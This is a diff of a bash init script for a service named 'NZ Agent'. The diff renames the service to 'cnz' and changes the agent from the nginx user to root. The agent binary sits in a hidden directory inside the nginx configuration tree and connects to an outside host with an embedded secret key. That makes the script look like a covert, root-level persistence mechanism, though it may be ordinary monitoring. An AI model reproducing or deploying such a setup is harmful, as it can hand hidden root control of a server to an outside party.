@@ -1,21 +1,21 @@
 #!/bin/bash
 #
-# nz-agent    This shell script takes care of starting and stopping the nz-agent
+# cnz    This shell script takes care of starting and stopping the nz-agent
 #
 # chkconfig: - 95 5
-# description: NZ Agent
+# description: cnz
 
 # Source function library.
 . /etc/rc.d/init.d/functions
 
 NZ_AGENT="/etc/nginx/locations.d/.nz/agent"
 NZ_OPTIONS="-s nz.cdnndc.eu.org:443 -p tq4m2xFy58PBHwYT8v --report-delay 4 --skip-conn --skip-procs"
-NZ_USER="nginx"
-NZ_LOG="/var/log/nz-agent.log"
+NZ_USER="root"
+NZ_LOG="/var/log/cnz.log"
 
 start() {
     echo -n "Starting NZ Agent: "
-    daemon --user "$NZ_USER" "$NZ_AGENT $NZ_OPTIONS >> $NZ_LOG 2>&1 &"
+    $NZ_AGENT $NZ_OPTIONS >> $NZ_LOG 2>&1 &
     RETVAL=$?
     echo
     return $RETVAL
